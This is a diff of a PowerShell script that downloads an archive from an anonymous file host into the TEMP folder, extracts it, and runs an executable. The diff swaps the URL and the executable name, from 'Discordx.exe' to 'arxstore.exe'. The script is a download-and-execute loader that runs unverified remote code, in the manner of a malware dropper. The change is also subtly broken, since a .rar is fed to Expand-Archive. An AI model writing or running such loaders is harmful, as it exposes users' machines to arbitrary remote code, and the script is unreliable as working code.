@@ -1,4 +1,4 @@
-$zipUrl = "https://files.catbox.moe/fefyjh.zip"
+$zipUrl = "https://files.catbox.moe/p6somt.rar"
 $tempDir = Join-Path $env:TEMP "temp1"
 $zipPath = Join-Path $env:TEMP "temp.zip"
 
@@ -12,7 +12,7 @@ Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
 Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
 
 # path exe
-$exePath = Join-Path $tempDir "Discordx.exe"
+$exePath = Join-Path $tempDir "arxstore.exe"
 
 # รันและรอจนปิด
 $process = Start-Process -FilePath $exePath -PassThru
